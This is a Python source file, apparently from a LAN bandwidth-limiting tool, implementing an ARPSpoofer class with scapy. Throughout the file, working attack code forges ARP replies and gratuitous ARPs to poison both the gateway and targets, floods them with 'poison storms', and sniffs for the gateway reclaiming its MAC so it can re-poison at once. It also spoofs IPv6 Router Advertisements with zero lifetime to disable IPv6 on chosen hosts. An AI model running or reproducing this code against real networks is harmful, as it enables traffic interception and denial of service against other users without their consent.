import time
import warnings
import threading
from scapy.all import (  # pylint: disable=no-name-in-module
    Ether, ARP, IPv6, conf, get_if_hwaddr, sniff,
    ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptPrefixInfo
)

# suppress scapy's noisy ARP warnings — we construct L2 headers manually
warnings.filterwarnings("ignore", message=".*Ethernet destination MAC.*")
warnings.filterwarnings("ignore", message=".*MAC address to reach destination.*")

from .host import Host
from evillimiter.common.globals import BROADCAST


class ARPSpoofer(object):
    def __init__(self, interface, gateway_ip, gateway_mac, interval=0.08, burst_count=20):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac

        # resolve attacker's own MAC once at init (used in L2 frame construction)
        self._attacker_mac = get_if_hwaddr(interface)

        # interval in seconds between spoofed ARP packet cycles
        # 0.08s = 12.5 cycles/sec — more aggressive, outpaces router ARP refresh
        self.interval = interval

        # number of times each ARP packet is sent per cycle
        # 20× burst — overwhelms router's ARP cache entry before re-learn
        self.burst_count = burst_count

        # initial storm: when first poisoning a target, send this many bursts
        # to rapidly establish our position in the ARP cache
        self._initial_storm_count = 50

        # derive gateway's IPv6 link-local address from its MAC (EUI-64)
        # used for RA spoofing to kill IPv6 on targets
        self._gateway_ipv6_ll = self._mac_to_ipv6_linklocal(gateway_mac)

        # send RA kill packets every N ARP cycles (RA doesn't need to be as frequent)
        # with interval=0.08s and ra_every=5, RA is sent every 0.4 seconds
        self._ra_every = 5
        self._ra_cycle = 0

        self._hosts = set()
        self._hosts_lock = threading.Lock()
        self._pending_storm = set()  # hosts that need initial poison storm
        self._pending_storm_lock = threading.Lock()
        self._running = False
        self._socket = None

        # ARP monitor: detects when gateway tries to reclaim real MAC
        self._monitor_running = False
        self._monitor_thread = None

    @staticmethod
    def _mac_to_ipv6_linklocal(mac):
        """
        Derive IPv6 link-local address from MAC address using EUI-64.
        Example: 98:4a:6b:be:ba:9b → fe80::9a4a:6bff:febe:ba9b
        """
        parts = [int(x, 16) for x in mac.split(':')]
        # flip U/L bit (bit 1 of first byte)
        parts[0] ^= 0x02
        # insert 0xff, 0xfe between byte 3 and 4
        eui64 = parts[:3] + [0xff, 0xfe] + parts[3:]
        # format as IPv6 link-local
        words = []
        for i in range(0, 8, 2):
            words.append('{:02x}{:02x}'.format(eui64[i], eui64[i + 1]))
        return 'fe80::{}:{}:{}:{}'.format(*words)

    def add(self, host):
        with self._hosts_lock:
            self._hosts.add(host)

        # queue initial poison storm for this host
        with self._pending_storm_lock:
            self._pending_storm.add(host)

        host.spoofed = True

    def remove(self, host, restore=True):
        with self._hosts_lock:
            self._hosts.discard(host)

        with self._pending_storm_lock:
            self._pending_storm.discard(host)

        if restore:
            self._restore(host)

        host.spoofed = False

    def start(self):
        self._running = True

        thread = threading.Thread(target=self._spoof, args=[], daemon=True)
        thread.start()

        # Start ARP monitor thread to detect gateway reclaiming real MAC
        self._monitor_running = True
        self._monitor_thread = threading.Thread(
            target=self._arp_monitor, args=[], daemon=True
        )
        self._monitor_thread.start()

    def stop(self):
        self._running = False
        self._monitor_running = False

    def _open_socket(self):
        """Open a persistent L2 raw socket for fast packet injection"""
        try:
            self._socket = conf.L2socket(iface=self.interface)
        except OSError as e:
            self._socket = None
            raise

    def _close_socket(self):
        """Safely close the persistent socket"""
        if self._socket is not None:
            try:
                self._socket.close()
            except Exception:
                pass
            finally:
                self._socket = None

    # -------------------------------------------------------------------------
    # ARP packet builders (IPv4 poisoning)
    # -------------------------------------------------------------------------

    def _build_l2_packets(self, host):
        """
        Pre-construct full Layer-2 Ethernet frames for ARP poisoning.
        6 packet types to aggressively poison both gateway and target:
        - Unicast ARP reply to gateway (standard)
        - Unicast ARP reply to target (standard)
        - Gratuitous ARP broadcast claiming host.ip (overwhelm gateway)
        - ARP request to gateway asking for gateway itself (forces reply, updates cache)
        - Gratuitous ARP broadcast claiming gateway.ip (overwhelm target)
        - ARP request to target asking for target itself
        """
        return [
            # 1. Unicast reply → gateway: "host.ip is at attacker's MAC"
            Ether(src=self._attacker_mac, dst=self.gateway_mac) /
            ARP(op=2,
                hwsrc=self._attacker_mac, psrc=host.ip,
                hwdst=self.gateway_mac, pdst=self.gateway_ip),

            # 2. Unicast reply → target: "gateway_ip is at attacker's MAC"
            Ether(src=self._attacker_mac, dst=host.mac) /
            ARP(op=2,
                hwsrc=self._attacker_mac, psrc=self.gateway_ip,
                hwdst=host.mac, pdst=host.ip),

            # 3. Gratuitous ARP broadcast: "host.ip is at attacker's MAC" (forces all to update)
            Ether(src=self._attacker_mac, dst=BROADCAST) /
            ARP(op=2,
                hwsrc=self._attacker_mac, psrc=host.ip,
                hwdst=BROADCAST, pdst=host.ip),

            # 4. ARP request → gateway: "who has gateway_ip? tell host.ip"
            #    Forces gateway to process and update its cache with our src
            Ether(src=self._attacker_mac, dst=self.gateway_mac) /
            ARP(op=1,
                hwsrc=self._attacker_mac, psrc=host.ip,
                hwdst=self.gateway_mac, pdst=self.gateway_ip),

            # 5. Gratuitous ARP broadcast: "gateway_ip is at attacker's MAC"
            Ether(src=self._attacker_mac, dst=BROADCAST) /
            ARP(op=2,
                hwsrc=self._attacker_mac, psrc=self.gateway_ip,
                hwdst=BROADCAST, pdst=self.gateway_ip),

            # 6. ARP request → target: "who has target? tell gateway"
            Ether(src=self._attacker_mac, dst=host.mac) /
            ARP(op=1,
                hwsrc=self._attacker_mac, psrc=self.gateway_ip,
                hwdst=host.mac, pdst=host.ip),
        ]

    def _build_restore_packets(self, host):
        """
        Construct legitimate ARP packets that restore the real MAC mappings.
        Sent to broadcast to ensure all devices update their ARP tables.
        """
        return [
            # Tell gateway: "host.ip is at host's REAL MAC"
            Ether(src=host.mac, dst=BROADCAST) /
            ARP(op=2,
                hwsrc=host.mac, psrc=host.ip,
                hwdst=BROADCAST, pdst=self.gateway_ip),

            # Tell target: "gateway_ip is at gateway's REAL MAC"
            Ether(src=self.gateway_mac, dst=BROADCAST) /
            ARP(op=2,
                hwsrc=self.gateway_mac, psrc=self.gateway_ip,
                hwdst=BROADCAST, pdst=host.ip)
        ]

    # -------------------------------------------------------------------------
    # RA packet builders (IPv6 kill / restore)
    # -------------------------------------------------------------------------

    def _build_ra_kill_packets(self, host):
        """
        Build ICMPv6 Router Advertisement with lifetime=0.
        Tells the target: "I am the router, and I am going away."
        Target will disable IPv6 default route and fallback to IPv4.
        Sent unicast to target's MAC so only the targeted host is affected.
        """
        return [
            Ether(src=self.gateway_mac, dst=host.mac) /
            IPv6(src=self._gateway_ipv6_ll, dst="ff02::1", hlim=255) /
            ICMPv6ND_RA(
                routerlifetime=0,   # "I'm no longer a router"
                reachabletime=0,
                retranstimer=0,
                M=0,                # no managed (DHCPv6) flag
                O=0                 # no other config flag
            ) /
            ICMPv6NDOptSrcLLAddr(lladdr=self.gateway_mac)
        ]

    def _build_ra_restore_packets(self, host):
        """
        Build ICMPv6 Router Advertisement with normal lifetime.
        Tells the target: "I am the router, IPv6 is available again."
        Sent on free to instantly re-enable IPv6 for the target.
        """
        return [
            Ether(src=self.gateway_mac, dst=host.mac) /
            IPv6(src=self._gateway_ipv6_ll, dst="ff02::1", hlim=255) /
            ICMPv6ND_RA(
                routerlifetime=1800,    # standard 30-minute lifetime
                reachabletime=30000,    # 30s reachable time
                retranstimer=1000,      # 1s retransmit timer
                M=0,
                O=0
            ) /
            ICMPv6NDOptSrcLLAddr(lladdr=self.gateway_mac)
        ]

    # -------------------------------------------------------------------------
    # Main spoofing loop
    # -------------------------------------------------------------------------

    def _spoof(self):
        """
        Main spoofing loop: ARP poisoning (every cycle) + RA kill (every N cycles).
        Uses persistent L2 socket with resilient error handling.
        Includes initial poison storm for newly added hosts.
        """
        consecutive_errors = 0
        max_consecutive_errors = 10

        # open persistent L2 socket once — reused for all sends
        try:
            self._open_socket()
        except OSError:
            self._running = False
            return

        try:
            while self._running:
                try:
                    # --- Initial poison storm for new hosts ---
                    with self._pending_storm_lock:
                        storm_hosts = self._pending_storm.copy()
                        self._pending_storm.clear()

                    for host in storm_hosts:
                        if not self._running:
                            return
                        storm_packets = self._build_l2_packets(host)
                        for _ in range(self._initial_storm_count):
                            for pkt in storm_packets:
                                self._socket.send(pkt)
                            time.sleep(0.005)  # tiny gap between bursts

                    self._hosts_lock.acquire()
                    hosts = self._hosts.copy()
                    self._hosts_lock.release()

                    # --- ARP poisoning (every cycle) ---
                    # Double-tap: send in two micro-bursts with gap
                    # This defeats routers that process ARP in batches
                    all_arp_packets = []
                    for host in hosts:
                        if not self._running:
                            return
                        all_arp_packets.extend(self._build_l2_packets(host))

                    # First burst
                    half_burst = max(1, self.burst_count // 2)
                    for pkt in all_arp_packets:
                        for _ in range(half_burst):
                            self._socket.send(pkt)

                    # Micro-gap between bursts (defeats batch processing)
                    time.sleep(0.01)

                    # Second burst
                    for pkt in all_arp_packets:
                        for _ in range(self.burst_count - half_burst):
                            self._socket.send(pkt)

                    # --- RA kill (every N cycles, only for --full hosts) ---
                    self._ra_cycle += 1
                    if self._ra_cycle >= self._ra_every:
                        self._ra_cycle = 0
                        for host in hosts:
                            if not self._running:
                                return
                            if host.ipv6_killed:
                                ra_packets = self._build_ra_kill_packets(host)
                                for pkt in ra_packets:
                                    self._socket.send(pkt)

                    consecutive_errors = 0
                    time.sleep(self.interval)

                except OSError as e:
                    # network buffer full, interface down, permission error
                    consecutive_errors += 1

                    if consecutive_errors >= max_consecutive_errors:
                        self._running = False
                        return

                    # attempt to reopen socket in case interface was reset
                    self._close_socket()
                    time.sleep(1)
                    try:
                        self._open_socket()
                    except OSError:
                        pass

                except Exception:
                    consecutive_errors += 1
                    if consecutive_errors >= max_consecutive_errors:
                        self._running = False
                        return
                    time.sleep(0.5)
        finally:
            self._close_socket()

    # -------------------------------------------------------------------------
    # ARP Monitor — detects gateway reclaiming real MAC and immediately re-poisons
    # -------------------------------------------------------------------------

    def _arp_monitor(self):
        """
        Passively sniff ARP traffic to detect when the gateway sends
        legitimate ARP replies to our spoofed targets, which would
        undo our poisoning. When detected, immediately re-poison.
        """
        def arp_handler(pkt):
            if not self._monitor_running:
                return
            if pkt.haslayer(ARP):
                arp = pkt[ARP]
                # Detect: gateway is sending ARP reply with its REAL MAC
                # This means gateway is trying to reclaim its position
                if (arp.op == 2 and  # ARP reply
                    arp.psrc == self.gateway_ip and
                    arp.hwsrc.lower() == self.gateway_mac.lower() and
                    arp.hwsrc.lower() != self._attacker_mac.lower()):
                    # Gateway is advertising its real MAC — re-poison NOW
                    self._emergency_repoison()
                # Detect: a target is sending ARP request for gateway
                # This means target may update cache soon — pre-emptively poison
                elif arp.op == 1 and arp.pdst == self.gateway_ip:
                    src_mac = arp.hwsrc.lower()
                    with self._hosts_lock:
                        for host in self._hosts:
                            if host.mac.lower() == src_mac:
                                self._targeted_repoison(host)
                                break

        def stop_filter(pkt):
            return not self._monitor_running

        try:
            sniff(
                iface=self.interface,
                filter='arp',
                prn=arp_handler,
                stop_filter=stop_filter,
                store=0
            )
        except Exception:
            pass

    def _emergency_repoison(self):
        """
        Immediately send a burst of poison packets to ALL spoofed hosts.
        Called when gateway is detected trying to reclaim its real MAC.
        Uses a fresh socket to avoid interfering with main spoof loop.
        """
        try:
            sock = conf.L2socket(iface=self.interface)
            try:
                with self._hosts_lock:
                    hosts = self._hosts.copy()

                for host in hosts:
                    packets = self._build_l2_packets(host)
                    for _ in range(30):  # aggressive burst
                        for pkt in packets:
                            sock.send(pkt)
            finally:
                sock.close()
        except Exception:
            pass

    def _targeted_repoison(self, host):
        """
        Send a quick burst of poison packets targeted at a specific host
        that was detected querying for the gateway's MAC.
        """
        try:
            sock = conf.L2socket(iface=self.interface)
            try:
                packets = self._build_l2_packets(host)
                for _ in range(15):  # moderate burst
                    for pkt in packets:
                        sock.send(pkt)
            finally:
                sock.close()
        except Exception:
            pass

    # -------------------------------------------------------------------------
    # Restore (ARP + RA)
    # -------------------------------------------------------------------------

    def _restore(self, host):
        """
        Restores host: remaps ARP to real addresses + re-enables IPv6 via RA.
        Uses a temporary socket with retry logic for reliability.
        """
        arp_packets = self._build_restore_packets(host)
        should_restore_ipv6 = host.ipv6_killed
        ra_packets = self._build_ra_restore_packets(host) if should_restore_ipv6 else []
        restore_count = 5

        for attempt in range(3):
            try:
                sock = conf.L2socket(iface=self.interface)
                try:
                    # restore ARP (IPv4)
                    for pkt in arp_packets:
                        for _ in range(restore_count):
                            sock.send(pkt)

                    # restore RA (IPv6) — only if --full was used
                    for pkt in ra_packets:
                        for _ in range(restore_count):
                            sock.send(pkt)

                    host.ipv6_killed = False
                    return  # success
                finally:
                    sock.close()
            except OSError:
                time.sleep(0.1)